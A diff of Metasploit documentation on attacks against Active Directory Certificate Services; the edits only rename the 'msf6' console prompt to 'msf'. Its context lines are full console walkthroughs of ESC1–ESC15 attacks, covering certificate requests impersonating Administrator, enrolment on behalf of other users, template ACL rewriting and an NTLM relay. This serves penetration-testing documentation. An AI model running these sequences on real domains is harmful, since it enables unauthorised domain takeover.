@@ -207,8 +207,8 @@ This will cause the module to log into the LDAP server on the target DC, and lis
 as well as the permissions that are required to enroll in these certificate templates. The following is a sample output of running this against a test server:
 
 ```msf
-msf6 > use auxiliary/gather/ldap_esc_vulnerable_cert_finder
-msf6 auxiliary(gather/ldap_esc_vulnerable_cert_finder) > show options
+msf > use auxiliary/gather/ldap_esc_vulnerable_cert_finder
+msf auxiliary(gather/ldap_esc_vulnerable_cert_finder) > show options
 
 Module options (auxiliary/gather/ldap_esc_vulnerable_cert_finder):
 
@@ -229,15 +229,15 @@ Module options (auxiliary/gather/ldap_esc_vulnerable_cert_finder):
 
 View the full module info with the info, or info -d command.
 
-msf6 auxiliary(gather/ldap_esc_vulnerable_cert_finder) > set DOMAIN DAFOREST
+msf auxiliary(gather/ldap_esc_vulnerable_cert_finder) > set DOMAIN DAFOREST
 DOMAIN => DAFOREST
-msf6 auxiliary(gather/ldap_esc_vulnerable_cert_finder) > set USERNAME normaluser
+msf auxiliary(gather/ldap_esc_vulnerable_cert_finder) > set USERNAME normaluser
 USERNAME => normaluser
-msf6 auxiliary(gather/ldap_esc_vulnerable_cert_finder) > set PASSWORD normalpass
+msf auxiliary(gather/ldap_esc_vulnerable_cert_finder) > set PASSWORD normalpass
 PASSWORD => normalpass
-msf6 auxiliary(gather/ldap_esc_vulnerable_cert_finder) > set RHOSTS 172.30.239.85
+msf auxiliary(gather/ldap_esc_vulnerable_cert_finder) > set RHOSTS 172.30.239.85
 RHOSTS => 172.30.239.85
-msf6 auxiliary(gather/ldap_esc_vulnerable_cert_finder) > run
+msf auxiliary(gather/ldap_esc_vulnerable_cert_finder) > run
 [*] Running module against 172.30.239.85
 
 [*] Discovering base DN automatically
@@ -318,7 +318,7 @@ msf6 auxiliary(gather/ldap_esc_vulnerable_cert_finder) > run
 [*]     Enrollment SIDs:
 [*]       * S-1-5-11 (Authenticated Users)
 [*] Auxiliary module execution completed
-msf6 auxiliary(gather/ldap_esc_vulnerable_cert_finder) >
+msf auxiliary(gather/ldap_esc_vulnerable_cert_finder) >
 ```
 
 From the output above we can determine that the SubCA certificate template is vulnerable to several attacks. However,
@@ -357,24 +357,24 @@ If we know the domain name is `daforest.com` and the domain administrator of thi
 quickly set this up:
 
 ```msf
-msf6 > use auxiliary/admin/dcerpc/icpr_cert
-msf6 auxiliary(admin/dcerpc/icpr_cert) > set CA daforest-WIN-BR0CCBA815B-CA
+msf > use auxiliary/admin/dcerpc/icpr_cert
+msf auxiliary(admin/dcerpc/icpr_cert) > set CA daforest-WIN-BR0CCBA815B-CA
 CA => daforest-WIN-BR0CCBA815B-CA
-msf6 auxiliary(admin/dcerpc/icpr_cert) > set CERT_TEMPLATE ESC1-Template
+msf auxiliary(admin/dcerpc/icpr_cert) > set CERT_TEMPLATE ESC1-Template
 CERT_TEMPLATE => ESC1-Template
-msf6 auxiliary(admin/dcerpc/icpr_cert) > set RHOSTS 172.30.239.85
+msf auxiliary(admin/dcerpc/icpr_cert) > set RHOSTS 172.30.239.85
 RHOSTS => 172.30.239.85
-msf6 auxiliary(admin/dcerpc/icpr_cert) > set SMBDomain DAFOREST
+msf auxiliary(admin/dcerpc/icpr_cert) > set SMBDomain DAFOREST
 SMBDomain => DAFOREST
-msf6 auxiliary(admin/dcerpc/icpr_cert) > set SMBPass normalpass
+msf auxiliary(admin/dcerpc/icpr_cert) > set SMBPass normalpass
 SMBPass => normalpass
-msf6 auxiliary(admin/dcerpc/icpr_cert) > set SMBUser normaluser
+msf auxiliary(admin/dcerpc/icpr_cert) > set SMBUser normaluser
 SMBUser => normaluser
-msf6 auxiliary(admin/dcerpc/icpr_cert) > set ALT_SID S-1-5-21-3402587289-1488798532-3618296993-1000
+msf auxiliary(admin/dcerpc/icpr_cert) > set ALT_SID S-1-5-21-3402587289-1488798532-3618296993-1000
 ALT_SID => S-1-5-21-3402587289-1488798532-3618296993-1000
-msf6 auxiliary(admin/dcerpc/icpr_cert) > set ALT_UPN Administrator@daforest.com
+msf auxiliary(admin/dcerpc/icpr_cert) > set ALT_UPN Administrator@daforest.com
 ALT_UPN => Administrator@daforest.com
-msf6 auxiliary(admin/dcerpc/icpr_cert) > run
+msf auxiliary(admin/dcerpc/icpr_cert) > run
 [*] Running module against 172.30.239.85
 
 [*] 172.30.239.85:445 - Requesting a certificate...
@@ -383,7 +383,7 @@ msf6 auxiliary(admin/dcerpc/icpr_cert) > run
 [*] 172.30.239.85:445 - Certificate UPN: Administrator@daforest.com
 [*] 172.30.239.85:445 - Certificate stored at: /home/gwillcox/.msf4/loot/20221216143830_default_unknown_windows.ad.cs_338144.pfx
 [*] Auxiliary module execution completed
-msf6 auxiliary(admin/dcerpc/icpr_cert) >
+msf auxiliary(admin/dcerpc/icpr_cert) >
 ```
 
 We can then use the `kerberos/get_ticket` module to gain a Kerberos ticket granting ticket (TGT) as the `Administrator`
@@ -401,20 +401,20 @@ To do this we will use the `ipcr_cert` module and we will set the usual options,
 For the first run, we will set the usual `RHOSTS`, `CA`, and `CERT_TEMPLATE` details, being sure to set `CERT_TEMPLATE` to the vulnerable `ESC2-Template` certificate template, and supply valid SMB login credentials. This will grant us a certificate for our current user that is based off of the vulnerable `ESC2-Template`:
 
 ```msf
-msf6 > use auxiliary/admin/dcerpc/icpr_cert
-msf6 auxiliary(admin/dcerpc/icpr_cert) > set RHOSTS 172.30.239.85
+msf > use auxiliary/admin/dcerpc/icpr_cert
+msf auxiliary(admin/dcerpc/icpr_cert) > set RHOSTS 172.30.239.85
 RHOSTS => 172.30.239.85
-msf6 auxiliary(admin/dcerpc/icpr_cert) > set CA daforest-WIN-BR0CCBA815B-CA
+msf auxiliary(admin/dcerpc/icpr_cert) > set CA daforest-WIN-BR0CCBA815B-CA
 CA => daforest-WIN-BR0CCBA815B-CA
-msf6 auxiliary(admin/dcerpc/icpr_cert) > set CERT_TEMPLATE ESC2-Template
+msf auxiliary(admin/dcerpc/icpr_cert) > set CERT_TEMPLATE ESC2-Template
 CERT_TEMPLATE => ESC2-Template
-msf6 auxiliary(admin/dcerpc/icpr_cert) > set SMBDomain DAFOREST
+msf auxiliary(admin/dcerpc/icpr_cert) > set SMBDomain DAFOREST
 SMBDomain => DAFOREST
-msf6 auxiliary(admin/dcerpc/icpr_cert) > set SMBPass normalpass
+msf auxiliary(admin/dcerpc/icpr_cert) > set SMBPass normalpass
 SMBPass => normalpass
-msf6 auxiliary(admin/dcerpc/icpr_cert) > set SMBUser normaluser
+msf auxiliary(admin/dcerpc/icpr_cert) > set SMBUser normaluser
 SMBUser => normaluser
-msf6 auxiliary(admin/dcerpc/icpr_cert) > show options
+msf auxiliary(admin/dcerpc/icpr_cert) > show options
 
 Module options (auxiliary/admin/dcerpc/icpr_cert):
 
@@ -444,7 +444,7 @@ Auxiliary action:
 
 View the full module info with the info, or info -d command.
 
-msf6 auxiliary(admin/dcerpc/icpr_cert) > run
+msf auxiliary(admin/dcerpc/icpr_cert) > run
 [*] Running module against 172.30.239.85
 
 [*] 172.30.239.85:445 - Requesting a certificate...
@@ -453,7 +453,7 @@ msf6 auxiliary(admin/dcerpc/icpr_cert) > run
 [*] 172.30.239.85:445 - Certificate SID: S-1-5-21-3290009963-1772292745-3260174523-1611
 [*] 172.30.239.85:445 - Certificate stored at: /home/gwillcox/.msf4/loot/20221216154930_default_unknown_windows.ad.cs_104207.pfx
 [*] Auxiliary module execution completed
-msf6 auxiliary(admin/dcerpc/icpr_cert) > loot
+msf auxiliary(admin/dcerpc/icpr_cert) > loot
 
 Loot
 ====
@@ -462,13 +462,13 @@ host  service  type           name             content               info       
 ----  -------  ----           ----             -------               ----                         ----
                windows.ad.cs  certificate.pfx  application/x-pkcs12  DAFOREST\normal Certificate  /home/gwillcox/.msf4/loot/20221216154930_default_unknown_windows.ad.cs_104207.pfx
 
-msf6 auxiliary(admin/dcerpc/icpr_cert) >
+msf auxiliary(admin/dcerpc/icpr_cert) >
 ```
 
 Next, we need to use the PFX file that we got to request another certificate to authenticate on behalf of another user. We will use the `PFX` option to specify the PFX file, and the `ON_BEHALF_OF` setting to specify the user we would like to authenticate on behalf of. Finally we will change the certificate template to another certificate template that we are able to enroll in. The default `User` certificate should work here since it allows enrollment by any authenticated domain user.
 
 ```msf
-msf6 auxiliary(admin/dcerpc/icpr_cert) > show options
+msf auxiliary(admin/dcerpc/icpr_cert) > show options
 
 Module options (auxiliary/admin/dcerpc/icpr_cert):
 
@@ -498,13 +498,13 @@ Auxiliary action:
 
 View the full module info with the info, or info -d command.
 
-msf6 auxiliary(admin/dcerpc/icpr_cert) > set ON_BEHALF_OF DAFOREST\\Administrator
+msf auxiliary(admin/dcerpc/icpr_cert) > set ON_BEHALF_OF DAFOREST\\Administrator
 ON_BEHALF_OF => DAFOREST\Administrator
-msf6 auxiliary(admin/dcerpc/icpr_cert) > set PFX /home/gwillcox/.msf4/loot/20221216154930_default_unknown_windows.ad.cs_104207.pfx
+msf auxiliary(admin/dcerpc/icpr_cert) > set PFX /home/gwillcox/.msf4/loot/20221216154930_default_unknown_windows.ad.cs_104207.pfx
 PFX => /home/gwillcox/.msf4/loot/20221216154930_default_unknown_windows.ad.cs_104207.pfx
-msf6 auxiliary(admin/dcerpc/icpr_cert) > set CERT_TEMPLATE User
+msf auxiliary(admin/dcerpc/icpr_cert) > set CERT_TEMPLATE User
 CERT_TEMPLATE => User
-msf6 auxiliary(admin/dcerpc/icpr_cert) > show options
+msf auxiliary(admin/dcerpc/icpr_cert) > show options
 
 Module options (auxiliary/admin/dcerpc/icpr_cert):
 
@@ -537,7 +537,7 @@ Auxiliary action:
 
 View the full module info with the info, or info -d command.
 
-msf6 auxiliary(admin/dcerpc/icpr_cert) > run
+msf auxiliary(admin/dcerpc/icpr_cert) > run
 [*] Running module against 172.30.239.85
 
 [*] 172.30.239.85:445 - Requesting a certificate...
@@ -546,7 +546,7 @@ msf6 auxiliary(admin/dcerpc/icpr_cert) > run
 [*] 172.30.239.85:445 - Certificate SID: S-1-5-21-3290009963-1772292745-3260174523-500
 [*] 172.30.239.85:445 - Certificate stored at: /home/gwillcox/.msf4/loot/20221216155701_default_unknown_windows.ad.cs_756798.pfx
 [*] Auxiliary module execution completed
-msf6 auxiliary(admin/dcerpc/icpr_cert) > loot
+msf auxiliary(admin/dcerpc/icpr_cert) > loot
 
 Loot
 ====
@@ -556,7 +556,7 @@ host  service  type           name             content               info       
                windows.ad.cs  certificate.pfx  application/x-pkcs12  DAFOREST\normal Certificate  /home/gwillcox/.msf4/loot/20221216154930_default_unknown_windows.ad.cs_104207.pfx
                windows.ad.cs  certificate.pfx  application/x-pkcs12  DAFOREST\normal Certificate  /home/gwillcox/.msf4/loot/20221216155701_default_unknown_windows.ad.cs_756798.pfx
 
-msf6 auxiliary(admin/dcerpc/icpr_cert) >
+msf auxiliary(admin/dcerpc/icpr_cert) >
 ```
 
 We can then use the `kerberos/get_ticket` module to gain a Kerberos ticket granting ticket (TGT) as the `Administrator`
@@ -592,8 +592,8 @@ Narrowing this list down to those we can actually enroll in as users, this leave
 We'll first get the cert using `ipcr_cert` with the `ESC3-Template1` certificate.
 
 ```msf
-msf6 > use auxiliary/admin/dcerpc/icpr_cert
-msf6 auxiliary(admin/dcerpc/icpr_cert) > show options
+msf > use auxiliary/admin/dcerpc/icpr_cert
+msf auxiliary(admin/dcerpc/icpr_cert) > show options
 
 Module options (auxiliary/admin/dcerpc/icpr_cert):
 
@@ -623,19 +623,19 @@ Auxiliary action:
 
 View the full module info with the info, or info -d command.
 
-msf6 auxiliary(admin/dcerpc/icpr_cert) > set SMBUser normaluser
+msf auxiliary(admin/dcerpc/icpr_cert) > set SMBUser normaluser
 SMBUser => normaluser
-msf6 auxiliary(admin/dcerpc/icpr_cert) > set SMBPass normalpass
+msf auxiliary(admin/dcerpc/icpr_cert) > set SMBPass normalpass
 SMBPass => normalpass
-msf6 auxiliary(admin/dcerpc/icpr_cert) > set SMBDomain DAFOREST
+msf auxiliary(admin/dcerpc/icpr_cert) > set SMBDomain DAFOREST
 SMBDomain => DAFOREST
-msf6 auxiliary(admin/dcerpc/icpr_cert) > set RHOSTS 172.30.239.85
+msf auxiliary(admin/dcerpc/icpr_cert) > set RHOSTS 172.30.239.85
 RHOSTS => 172.30.239.85
-msf6 auxiliary(admin/dcerpc/icpr_cert) > set CA daforest-WIN-BR0CCBA815B-CA
+msf auxiliary(admin/dcerpc/icpr_cert) > set CA daforest-WIN-BR0CCBA815B-CA
 CA => daforest-WIN-BR0CCBA815B-CA
-msf6 auxiliary(admin/dcerpc/icpr_cert) > set CERT_TEMPLATE ESC3-Template1
+msf auxiliary(admin/dcerpc/icpr_cert) > set CERT_TEMPLATE ESC3-Template1
 CERT_TEMPLATE => ESC3-Template1
-msf6 auxiliary(admin/dcerpc/icpr_cert) > run
+msf auxiliary(admin/dcerpc/icpr_cert) > run
 [*] Running module against 172.30.239.85
 
 [*] 172.30.239.85:445 - Requesting a certificate...
@@ -644,7 +644,7 @@ msf6 auxiliary(admin/dcerpc/icpr_cert) > run
 [*] 172.30.239.85:445 - Certificate SID: S-1-5-21-3290009963-1772292745-3260174523-1611
 [*] 172.30.239.85:445 - Certificate stored at: /home/gwillcox/.msf4/loot/20221216174221_default_unknown_windows.ad.cs_027866.pfx
 [*] Auxiliary module execution completed
-msf6 auxiliary(admin/dcerpc/icpr_cert) > loot
+msf auxiliary(admin/dcerpc/icpr_cert) > loot
 
 Loot
 ====
@@ -654,17 +654,17 @@ host  service  type           name             content               info       
                windows.ad.cs  certificate.pfx  application/x-pkcs12  DAFOREST\normal Certificate  /home/gwillcox/.msf4/loot/20221216173718_default_unknown_windows.ad.cs_580032.pfx
                windows.ad.cs  certificate.pfx  application/x-pkcs12  DAFOREST\normal Certificate  /home/gwillcox/.msf4/loot/20221216174221_default_unknown_windows.ad.cs_027866.pfx
 
-msf6 auxiliary(admin/dcerpc/icpr_cert) >
+msf auxiliary(admin/dcerpc/icpr_cert) >
 ```
 
 Next, we'll try use this certificate to request another certificate on behalf of a different user. For this stage we need to specify another certificate that is vulnerable to the ESC3_TEMPLATE_2 attack vector that we are able to enroll in. We will use the `User` template for this:
 
 ```msf
-msf6 auxiliary(admin/dcerpc/icpr_cert) > set PFX /home/gwillcox/.msf4/loot/20221216174221_default_unknown_windows.ad.cs_027866.pfx
+msf auxiliary(admin/dcerpc/icpr_cert) > set PFX /home/gwillcox/.msf4/loot/20221216174221_default_unknown_windows.ad.cs_027866.pfx
 PFX => /home/gwillcox/.msf4/loot/20221216174221_default_unknown_windows.ad.cs_027866.pfx
-msf6 auxiliary(admin/dcerpc/icpr_cert) > set ON_BEHALF_OF DAFOREST\\Administrator
+msf auxiliary(admin/dcerpc/icpr_cert) > set ON_BEHALF_OF DAFOREST\\Administrator
 ON_BEHALF_OF => DAFOREST\Administrator
-msf6 auxiliary(admin/dcerpc/icpr_cert) > show options
+msf auxiliary(admin/dcerpc/icpr_cert) > show options
 
 Module options (auxiliary/admin/dcerpc/icpr_cert):
 
@@ -697,9 +697,9 @@ Auxiliary action:
 
 View the full module info with the info, or info -d command.
 
-msf6 auxiliary(admin/dcerpc/icpr_cert) > set CERT_TEMPLATE User
+msf auxiliary(admin/dcerpc/icpr_cert) > set CERT_TEMPLATE User
 CERT_TEMPLATE => User
-msf6 auxiliary(admin/dcerpc/icpr_cert) > run
+msf auxiliary(admin/dcerpc/icpr_cert) > run
 [*] Running module against 172.30.239.85
 
 [*] 172.30.239.85:445 - Requesting a certificate...
@@ -708,15 +708,15 @@ msf6 auxiliary(admin/dcerpc/icpr_cert) > run
 [*] 172.30.239.85:445 - Certificate SID: S-1-5-21-3290009963-1772292745-3260174523-500
 [*] 172.30.239.85:445 - Certificate stored at: /home/gwillcox/.msf4/loot/20221216174559_default_unknown_windows.ad.cs_570105.pfx
 [*] Auxiliary module execution completed
-msf6 auxiliary(admin/dcerpc/icpr_cert) >
+msf auxiliary(admin/dcerpc/icpr_cert) >
 ```
 
 Just to show this is also possible with `ESC3-Template2` here is a snippet showing that also works:
 
 ```msf
-msf6 auxiliary(admin/dcerpc/icpr_cert) > set CERT_TEMPLATE ESC3-Template2
+msf auxiliary(admin/dcerpc/icpr_cert) > set CERT_TEMPLATE ESC3-Template2
 CERT_TEMPLATE => ESC3-Template2
-msf6 auxiliary(admin/dcerpc/icpr_cert) > show options
+msf auxiliary(admin/dcerpc/icpr_cert) > show options
 
 Module options (auxiliary/admin/dcerpc/icpr_cert):
 
@@ -749,7 +749,7 @@ Auxiliary action:
 
 View the full module info with the info, or info -d command.
 
-msf6 auxiliary(admin/dcerpc/icpr_cert) > run
+msf auxiliary(admin/dcerpc/icpr_cert) > run
 [*] Running module against 172.30.239.85
 
 [*] 172.30.239.85:445 - Requesting a certificate...
@@ -758,7 +758,7 @@ msf6 auxiliary(admin/dcerpc/icpr_cert) > run
 [*] 172.30.239.85:445 - Certificate SID: S-1-5-21-3290009963-1772292745-3260174523-500
 [*] 172.30.239.85:445 - Certificate stored at: /home/gwillcox/.msf4/loot/20221216180342_default_unknown_windows.ad.cs_390825.pfx
 [*] Auxiliary module execution completed
-msf6 auxiliary(admin/dcerpc/icpr_cert) >
+msf auxiliary(admin/dcerpc/icpr_cert) >
 ```
 
 We can then use the `kerberos/get_ticket` module to gain a Kerberos ticket granting ticket (TGT) as the `Administrator`
@@ -774,20 +774,20 @@ the `ESC4-Test` certificate template does not allow the certificate's subject na
 `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` flag is not set in the `msPKI-Certificate-Name-Flag` field).
 
 ```msf
-msf6 > use auxiliary/admin/dcerpc/icpr_cert 
-msf6 auxiliary(admin/dcerpc/icpr_cert) > set RHOSTS 172.30.239.85
+msf > use auxiliary/admin/dcerpc/icpr_cert 
+msf auxiliary(admin/dcerpc/icpr_cert) > set RHOSTS 172.30.239.85
 RHOSTS => 172.30.239.85
-msf6 auxiliary(admin/dcerpc/icpr_cert) > set SMBUser normaluser
+msf auxiliary(admin/dcerpc/icpr_cert) > set SMBUser normaluser
 SMBUser => normaluser
-msf6 auxiliary(admin/dcerpc/icpr_cert) > set SMBPass normalpass
+msf auxiliary(admin/dcerpc/icpr_cert) > set SMBPass normalpass
 SMBPass => normalpass
-msf6 auxiliary(admin/dcerpc/icpr_cert) > set CA daforest-WIN-BR0CCBA815B-CA
+msf auxiliary(admin/dcerpc/icpr_cert) > set CA daforest-WIN-BR0CCBA815B-CA
 CA => daforest-WIN-BR0CCBA815B-CA
-msf6 auxiliary(admin/dcerpc/icpr_cert) > set CERT_TEMPLATE ESC4-Test
+msf auxiliary(admin/dcerpc/icpr_cert) > set CERT_TEMPLATE ESC4-Test
 CERT_TEMPLATE => ESC4-Test
-msf6 auxiliary(admin/dcerpc/icpr_cert) > set ALT_UPN Administrator@daforest.com
+msf auxiliary(admin/dcerpc/icpr_cert) > set ALT_UPN Administrator@daforest.com
 ALT_UPN => Administrator@daforest.com
-msf6 auxiliary(admin/dcerpc/icpr_cert) > run 
+msf auxiliary(admin/dcerpc/icpr_cert) > run 
 [*] Running module against 172.30.239.85
 
 [-] 172.30.239.85:445 - There was an error while requesting the certificate.
@@ -796,7 +796,7 @@ msf6 auxiliary(admin/dcerpc/icpr_cert) > run
 [-] 172.30.239.85:445 -   Source:  (0x0009) FACILITY_SECURITY: The source of the error code is the Security API layer.
 [-] 172.30.239.85:445 -   HRESULT: (0x80094812) CERTSRV_E_SUBJECT_EMAIL_REQUIRED: The email name is unavailable and cannot be added to the Subject or Subject Alternate name.
 [*] Auxiliary module execution completed
-msf6 auxiliary(admin/dcerpc/icpr_cert) > 
+msf auxiliary(admin/dcerpc/icpr_cert) > 
 ```
 
 Next, we use the `ad_cs_cert_template` module to update the `ESC4-Test` certificate template. This process first makes a
@@ -805,20 +805,20 @@ update the object in Active Directory. The local certificate template data can b
 descriptor.
 
 ```msf
-msf6 auxiliary(admin/dcerpc/icpr_cert) > use auxiliary/admin/ldap/ad_cs_cert_template 
-msf6 auxiliary(admin/ldap/ad_cs_cert_template) > set RHOSTS 172.30.239.85
+msf auxiliary(admin/dcerpc/icpr_cert) > use auxiliary/admin/ldap/ad_cs_cert_template 
+msf auxiliary(admin/ldap/ad_cs_cert_template) > set RHOSTS 172.30.239.85
 RHOSTS => 172.30.239.85
-msf6 auxiliary(admin/ldap/ad_cs_cert_template) > set USERNAME normaluser
+msf auxiliary(admin/ldap/ad_cs_cert_template) > set USERNAME normaluser
 USERNAME => normaluser
-msf6 auxiliary(admin/ldap/ad_cs_cert_template) > set PASSWORD normalpass
+msf auxiliary(admin/ldap/ad_cs_cert_template) > set PASSWORD normalpass
 PASSWORD => normalpass
-msf6 auxiliary(admin/ldap/ad_cs_cert_template) > set CERT_TEMPLATE ESC4-Test
+msf auxiliary(admin/ldap/ad_cs_cert_template) > set CERT_TEMPLATE ESC4-Test
 CERT_TEMPLATE => ESC4-Test
-msf6 auxiliary(admin/ldap/ad_cs_cert_template) > set ACTION UPDATE 
+msf auxiliary(admin/ldap/ad_cs_cert_template) > set ACTION UPDATE 
 ACTION => UPDATE
-msf6 auxiliary(admin/ldap/ad_cs_cert_template) > set VERBOSE true 
+msf auxiliary(admin/ldap/ad_cs_cert_template) > set VERBOSE true 
 VERBOSE => true
-msf6 auxiliary(admin/ldap/ad_cs_cert_template) > run
+msf auxiliary(admin/ldap/ad_cs_cert_template) > run
 [*] Running module against 172.30.239.85
 
 [+] Successfully bound to the LDAP server!
@@ -830,32 +830,32 @@ msf6 auxiliary(admin/ldap/ad_cs_cert_template) > run
 [*] Parsing SDDL text: D:PAI(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;AU)
 [+] The operation completed successfully!
 [*] Auxiliary module execution completed
-msf6 auxiliary(admin/ldap/ad_cs_cert_template) > 
+msf auxiliary(admin/ldap/ad_cs_cert_template) > 
 ```
 
 Now that the certificate template has been updated to be vulnerable to ESC1, then we can use the `previous` shortcut
 to switch back to the last module and reattempt to issue the certificate. This time, the operation succeeds.
 
 ```msf
-msf6 auxiliary(admin/ldap/ad_cs_cert_template) > previous 
-msf6 auxiliary(admin/dcerpc/icpr_cert) > run
+msf auxiliary(admin/ldap/ad_cs_cert_template) > previous 
+msf auxiliary(admin/dcerpc/icpr_cert) > run
 [*] Running module against 172.30.239.85
 
 [+] 172.30.239.85:445 - The requested certificate was issued.
 [*] 172.30.239.85:445 - Certificate UPN: Administrator@daforest.com
 [*] 172.30.239.85:445 - Certificate stored at: /home/smcintyre/.msf4/loot/20230505083913_default_172.30.239.85_windows.ad.cs_275324.pfx
 [*] Auxiliary module execution completed
-msf6 auxiliary(admin/dcerpc/icpr_cert) > 
+msf auxiliary(admin/dcerpc/icpr_cert) > 
 ```
 
 Finally, we switch back to the `ad_cs_cert_template` module to restore the original configuration. We do this by
 setting the local template data option `TEMPLATE_FILE` to the JSON file that was created by the previous run.
 
 ```msf
-msf6 auxiliary(admin/dcerpc/icpr_cert) > previous 
-msf6 auxiliary(admin/ldap/ad_cs_cert_template) > set TEMPLATE_FILE /home/smcintyre/.msf4/loot/20230505083802_default_172.30.239.85_windows.ad.cs.te_593597.json
+msf auxiliary(admin/dcerpc/icpr_cert) > previous 
+msf auxiliary(admin/ldap/ad_cs_cert_template) > set TEMPLATE_FILE /home/smcintyre/.msf4/loot/20230505083802_default_172.30.239.85_windows.ad.cs.te_593597.json
 TEMPLATE_FILE => /home/smcintyre/.msf4/loot/20230505083802_default_172.30.239.85_windows.ad.cs.te_593597.json
-msf6 auxiliary(admin/ldap/ad_cs_cert_template) > run
+msf auxiliary(admin/ldap/ad_cs_cert_template) > run
 [*] Running module against 172.30.239.85
 
 [+] Successfully bound to the LDAP server!
@@ -866,7 +866,7 @@ msf6 auxiliary(admin/ldap/ad_cs_cert_template) > run
 [*] Certificate template data written to: /home/smcintyre/.msf4/loot/20230505083942_default_172.30.239.85_windows.ad.cs.te_000095.json
 [+] The operation completed successfully!
 [*] Auxiliary module execution completed
-msf6 auxiliary(admin/ldap/ad_cs_cert_template) >
+msf auxiliary(admin/ldap/ad_cs_cert_template) >
 ```
 
 At this point the certificate template's configuration has been restored and the operator has a certificate that can be
@@ -892,10 +892,10 @@ In the following example the AUTO mode is used to issue a certificate for the MS
 authenticated.
 
 ```msf
-msf6 auxiliary(server/relay/esc8) > set RHOSTS 172.30.239.85
-msf6 auxiliary(server/relay/esc8) > run
+msf auxiliary(server/relay/esc8) > set RHOSTS 172.30.239.85
+msf auxiliary(server/relay/esc8) > run
 [*] Auxiliary module running as background job 1.
-msf6 auxiliary(server/relay/esc8) > 
+msf auxiliary(server/relay/esc8) > 
 [*] SMB Server is running. Listening on 0.0.0.0:445
 [*] Server started.
 [*] New request from 192.168.159.129
@@ -931,7 +931,7 @@ permissions will be included in the resulting Kerberos ticket in the notes secti
 ESC13-Test template is vulnerable to ESC13 and will yield a ticket including the ESC13-Group permissions.
 
 ```
-msf6 auxiliary(gather/ldap_esc_vulnerable_cert_finder) > run
+msf auxiliary(gather/ldap_esc_vulnerable_cert_finder) > run
 ...
 [+] Template: ESC13-Test
 [*]   Distinguished Name: CN=ESC13-Test,CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=collalabs1,DC=local
@@ -954,20 +954,20 @@ In this case, the ticket can be issued with the `icpr_cert` module. No additiona
 certificate beyond the standard `CA`, `CERT_TEMPLATE`, target and authentication options.
 
 ```
-msf6 > use auxiliary/admin/dcerpc/icpr_cert 
-msf6 auxiliary(admin/dcerpc/icpr_cert) > set RHOSTS 172.30.239.85
+msf > use auxiliary/admin/dcerpc/icpr_cert 
+msf auxiliary(admin/dcerpc/icpr_cert) > set RHOSTS 172.30.239.85
 RHOSTS => 172.30.239.85
-msf6 auxiliary(admin/dcerpc/icpr_cert) > set SMBUser normaluser
+msf auxiliary(admin/dcerpc/icpr_cert) > set SMBUser normaluser
 SMBUser => normaluser
-msf6 auxiliary(admin/dcerpc/icpr_cert) > set SMBDomain COLLALABS1
+msf auxiliary(admin/dcerpc/icpr_cert) > set SMBDomain COLLALABS1
 SMBDomain => COLLALABS1
-msf6 auxiliary(admin/dcerpc/icpr_cert) > set SMBPass normalpass
+msf auxiliary(admin/dcerpc/icpr_cert) > set SMBPass normalpass
 SMBPass => normalpass
-msf6 auxiliary(admin/dcerpc/icpr_cert) > set CA collalabs1-SRV-ADDS01-CA
+msf auxiliary(admin/dcerpc/icpr_cert) > set CA collalabs1-SRV-ADDS01-CA
 CA => collalabs1-SRV-ADDS01-CA
-msf6 auxiliary(admin/dcerpc/icpr_cert) > set CERT_TEMPLATE ESC13-Test
+msf auxiliary(admin/dcerpc/icpr_cert) > set CERT_TEMPLATE ESC13-Test
 CERT_TEMPLATE => ESC13-Test
-msf6 auxiliary(admin/dcerpc/icpr_cert) > run
+msf auxiliary(admin/dcerpc/icpr_cert) > run
 [*] Running module against 172.30.239.85
 
 [+] 172.30.239.85:445 - The requested certificate was issued.
@@ -976,7 +976,7 @@ msf6 auxiliary(admin/dcerpc/icpr_cert) > run
 [*] 172.30.239.85:445 - Certificate UPN: normaluser@collalabs1.local
 [*] 172.30.239.85:445 - Certificate stored at: /home/normaluser/.msf4/loot/20240226170310_default_172.30.239.85_windows.ad.cs_917878.pfx
 [*] Auxiliary module execution completed
-msf6 auxiliary(admin/dcerpc/icpr_cert) >
+msf auxiliary(admin/dcerpc/icpr_cert) >
 ```
 
 We can then use the `kerberos/get_ticket` module to gain a Kerberos ticket granting ticket (TGT) with the `ESC13-Group`
@@ -993,25 +993,25 @@ used for authentication to LDAP via SCHANNEL. The operator can then perform LDAP
 specified in the alternate UPN.
 
 ```msf
-msf6 auxiliary(admin/dcerpc/icpr_cert) > set RHOSTS 172.30.239.85
+msf auxiliary(admin/dcerpc/icpr_cert) > set RHOSTS 172.30.239.85
 RHOSTS => 172.30.239.85
-msf6 auxiliary(admin/dcerpc/icpr_cert) > set SMBUser normaluser
+msf auxiliary(admin/dcerpc/icpr_cert) > set SMBUser normaluser
 SMBUser => normaluser
-msf6 auxiliary(admin/dcerpc/icpr_cert) > set SMBDomain COLLALABS1
+msf auxiliary(admin/dcerpc/icpr_cert) > set SMBDomain COLLALABS1
 SMBDomain => COLLALABS1
-msf6 auxiliary(admin/dcerpc/icpr_cert) > set SMBPass normalpass
+msf auxiliary(admin/dcerpc/icpr_cert) > set SMBPass normalpass
 SMBPass => normalpass
-msf6 auxiliary(admin/dcerpc/icpr_cert) > set CA collalabs1-SRV-ADDS01-CA
+msf auxiliary(admin/dcerpc/icpr_cert) > set CA collalabs1-SRV-ADDS01-CA
 CA => collalabs1-SRV-ADDS01-CA
-msf6 auxiliary(admin/dcerpc/icpr_cert) > set CERT_TEMPLATE ESC15-Test
+msf auxiliary(admin/dcerpc/icpr_cert) > set CERT_TEMPLATE ESC15-Test
 CERT_TEMPLATE => ESC15-Test
-msf6 auxiliary(admin/dcerpc/icpr_cert) > set ADD_CERT_APP_POLICY 1.3.6.1.5.5.7.3.2
+msf auxiliary(admin/dcerpc/icpr_cert) > set ADD_CERT_APP_POLICY 1.3.6.1.5.5.7.3.2
 ADD_CERT_APP_POLICY => 1.3.6.1.5.5.7.3.2
-msf6 auxiliary(admin/dcerpc/icpr_cert) > set ALT_UPN administrator@collalabs1.local
+msf auxiliary(admin/dcerpc/icpr_cert) > set ALT_UPN administrator@collalabs1.local
 ALT_UPN => administrator@collalabs1.local
-msf6 auxiliary(admin/dcerpc/icpr_cert) > set ALT_SID S-1-5-21-3402587289-1488798532-3618296993-1000
+msf auxiliary(admin/dcerpc/icpr_cert) > set ALT_SID S-1-5-21-3402587289-1488798532-3618296993-1000
 ALT_SID => S-1-5-21-3402587289-1488798532-3618296993-1000
